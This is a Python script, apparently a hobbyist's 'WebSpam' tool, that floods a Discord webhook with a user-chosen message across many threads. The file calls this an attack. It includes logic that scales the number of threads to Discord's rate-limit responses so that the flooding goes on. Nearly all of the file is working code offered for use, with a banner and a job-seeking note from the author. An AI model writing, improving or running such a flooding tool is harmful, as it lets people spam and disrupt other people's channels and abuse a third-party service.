"""
HEY PLEASE READ!!!!
------------------------
Hello! I'm Yassin, a cybersecurity enthusiast and programmer with a passion for ethical hacking and security research.
I'm actively seeking job opportunities in the cybersecurity field. If you have any leads, advice, or opportunities,
please feel free to reach out to me on Discord: yassin1234.
------------------------
Thank you for your support!
"""

import requests  # For sending messages to Discord
import threading # Lets the program do multiple things at once
import sys       # Used to quit the program properly
import time      # Handles waiting and countdowns
from datetime import datetime # Tracks message timestamps
from collections import deque # Keeps track of recent successful messages (For the AI)
import os # Clears the screen when starting

# The gradient text
def gradient_text(text, start_color, end_color):
    gradient = []
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient.append(f"\033[38;2;{r};{g};{b}m{char}")
    return "".join(gradient) + "\033[0m"  # Reset color at the end

# Gradient styles for different sections
def gradient_success(text): return gradient_text(text, (0, 255, 0), (0, 200, 200))  # Green → Cyan
def gradient_error(text): return gradient_text(text, (255, 0, 0), (200, 0, 0))  # Red → Dark Red
def gradient_title(text): return gradient_text(text, (255, 140, 0), (255, 215, 0))  # Orange → Gold
def gradient_text_body(text): return gradient_text(text, (180, 180, 180), (255, 255, 255))  # Gray → White
def gradient_alert(text): return gradient_text(text, (255, 255, 0), (255, 140, 0))  # Yellow → Orange
def gradient_blue(text): return gradient_text(text, (173, 216, 230), (0, 0, 139))  # Light Blue → Dark Blue
def gradient_purple(text): return gradient_text(text, (221, 160, 221), (128, 0, 128))  # Light Purple → Dark Purple


# Clears the terminal
def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')


############################
# Global control variables #
############################
running = True
message_count = 0
success_times = deque()
print_lock = threading.Lock()
counter_lock = threading.Lock()
thread_control_lock = threading.Lock()
original_thread_count = 0
current_thread_count = 0
cooldown_active = False

############################
#          Colors          #
############################
SUCCESS = gradient_success
ERROR = gradient_error
WARNING = gradient_alert
INPUT = gradient_text_body
BANNER_COLOR = gradient_title
BLUE = gradient_blue
PURPLE = gradient_purple

# Banner (Logo)
BANNER = rf"""
{gradient_title(" __       __            __         ______")}
{gradient_title("|  \\  _  |  \\          |  \\       /      \\")}
{gradient_title("| $$ / \\ | $$  ______  | $$____  |  $$$$$$\\  ______    ______   ______ ____")}
{gradient_title("| $$/  \\$| $$ /      \\ | $$    \\ | $$___\\$$ /      \\  |      \\ |      \\    \\")}
{gradient_title("| $$  $$$\\ $$|  $$$$$$\\| $$$$$$$\\ \\$$    \\ |  $$$$$$\\  \\$$$$$$\\| $$$$$$\\$$$$\\")}
{gradient_title("| $$ $$\\$$\\$$| $$    $$| $$  | $$ _\\$$$$$$\\| $$  | $$ /      $$| $$ | $$ | $$")}
{gradient_title("| $$$$  \\$$$$| $$$$$$$$| $$__/ $$|  \\__| $$| $$__/ $$|  $$$$$$$| $$ | $$ | $$")}
{gradient_title("| $$$    \\$$$ \\$$     \\| $$    $$ \\$$    $$| $$    $$ \\$$    $$| $$ | $$ | $$")}
{gradient_title(" \\$$      \\$$  \\$$$$$$$ \\$$$$$$$   \\$$$$$$ | $$$$$$$   \\$$$$$$$ \\$$  \\$$  \\$$")}
{gradient_title("                                           | $$                             ")} {gradient_success("v1.0")}
{gradient_title("                                           | $$")}
{gradient_title("                                            \\$$")}
"""

def print_banner():
    clear_terminal()
    print (BANNER)
    print (BANNER_COLOR("                 Creator: Yassin Designs           GitHub: Yassin2626"))
    print (BANNER_COLOR("                 Discord: yassin1234                  Version: 1.0"))
    print ("")
    print ("")


def monitor_success_rate():
    global current_thread_count, cooldown_active, original_thread_count
    while running:
        time.sleep(2)  # Check every 2 seconds
        with thread_control_lock:
            # Remove successes older than 3 seconds
            now = datetime.now()
            while success_times and (now - success_times[0]).total_seconds() > 3:
                success_times.popleft()
            
            # Calculate current success rate
            success_rate = len(success_times)
            
            if not cooldown_active:
                if success_rate < current_thread_count * 0.5:
                    # Trigger cooldown
                    new_count = max(1, success_rate)
                    if new_count < current_thread_count:
                        print(f"{WARNING(f'[*] Adjusting threads from {current_thread_count} to {new_count}')}")
                        current_thread_count = new_count
                        cooldown_active = True
                        threading.Timer(10, reset_thread_count).start()
                elif success_rate > current_thread_count * 1.5:
                    current_thread_count = min(original_thread_count, current_thread_count + 1)

def reset_thread_count():
    global current_thread_count, cooldown_active
    with thread_control_lock:
        current_thread_count = original_thread_count
        cooldown_active = False
        print(f"{WARNING(f'[*] Resetting to original {original_thread_count} threads')}")

def spam_thread(webhook, message, delay):
    global message_count
    session = requests.Session()
    
    while running:
        try:
            # Check if we should be active
            with thread_control_lock:
                if current_thread_count < original_thread_count and threading.active_count() > current_thread_count + 3:
                    return

            response = session.post(
                webhook,
                json={'content': message},
                timeout=3
            )
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            status = response.status_code

            with counter_lock:
                global message_count
                message_count += 1
                count = message_count

            with print_lock:
                if status == 204:
                    success_times.append(datetime.now())
                    print(f"{gradient_text_body(timestamp)} {BANNER_COLOR('[WEBSPAM]')} {SUCCESS('[SUCCESS]')} {gradient_success('Message sent!')} {BLUE(f'[{status}]')} {PURPLE(f'[{count:02d}]')}")
                else:
                    error_msg = f"Webhook error {status}"
                    if status == 429:
                        error_msg += f" (Wait: {response.headers.get('Retry-After', 1)}ms)"
                        print(f"{gradient_text_body(timestamp)} {BANNER_COLOR('[WEBSPAM]')} {ERROR('[ERROR]')} {gradient_alert(error_msg)} {BLUE(f'[{status}]')} {PURPLE(f'[{count:02d}]')}")
                    else:
                        print(f"{gradient_text_body(timestamp)} {BANNER_COLOR('[WEBSPAM]')} {ERROR('[ERROR]')} {gradient_error(error_msg)} {BLUE(f'[{status}]')} {PURPLE(f'[{count:02d}]')}")

        except Exception as e:
            with counter_lock:
                message_count += 1
                count = message_count
            with print_lock:
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"{gradient_text_body(timestamp)} {BANNER_COLOR('[WEBSPAM]')} {ERROR('[ERROR]')} {gradient_error('Connection failed')} {PURPLE(f'[{count:02d}]')}")

        time.sleep(delay / 1000)

def start_attack():
    global running, original_thread_count, current_thread_count
    print_banner()

    try:
        # Get delay input
        while True:
            delay_input = input(f"{INPUT('[?] Delay (ms) [1000]: ')}")
            if not delay_input:
                delay = 1000.0
                break
            try:
                delay = float(delay_input)
                break
            except ValueError:
                print(f"{ERROR('[ERROR]')} {ERROR ('Please enter a valid number!')}")
        
        # Get webhook URL
        while True:
            webhook = input(f"{INPUT('[?] Webhook URL: ')}")
            if webhook.startswith(('http://', 'https://')):
                break
            else:
                print(f"{ERROR('[ERROR]')} {ERROR('Invalid webhook URL! Please enter a valid URL starting with http:// or https://')}")
        
        # Get message
        message = input(f"{INPUT('[?] Message: ')}")
        
        # Get number of threads
        while True:
            number_threads_input = input(f"{INPUT('[?] How many threads: ')}")
            try:
                number_threads = int(number_threads_input)
                break
            except ValueError:
                print(f"{ERROR('[ERROR]')} {ERROR ('Please enter a valid number!')}")
        
        original_thread_count = number_threads
        current_thread_count = number_threads
        
        clear_terminal()
        print_banner()
        print(f"\n{WARNING(f'[*] Starting attack ({delay}ms delay)...')}")
        print(f"{WARNING(f'[*] Starting attack ({number_threads} Threads)...')}")
        print(f"{WARNING('[*] Press CTRL+C to stop')}")
        print(f"{WARNING('[*] Launching in 3 seconds')}")

        for i in range(3, 0, -1):
            print(f"{WARNING(str(i))}")
            time.sleep(1)
        print_banner()
        print("")

        # Start monitoring thread
        monitor_thread = threading.Thread(target=monitor_success_rate)
        monitor_thread.daemon = True
        monitor_thread.start()

        # Start worker threads
        threads = []
        for _ in range(number_threads):
            t = threading.Thread(target=spam_thread, args=(webhook, message, delay))
            t.daemon = True
            t.start()
            threads.append(t)

        while running:
            time.sleep(0.01)

    except KeyboardInterrupt:
        running = False
        print(f"\n{WARNING('[*] Stopping...')}")
        time.sleep(0.5)
        print(f"{SUCCESS('[+] Attack stopped!')}")
        sys.exit()

if __name__ == "__main__":
    start_attack()
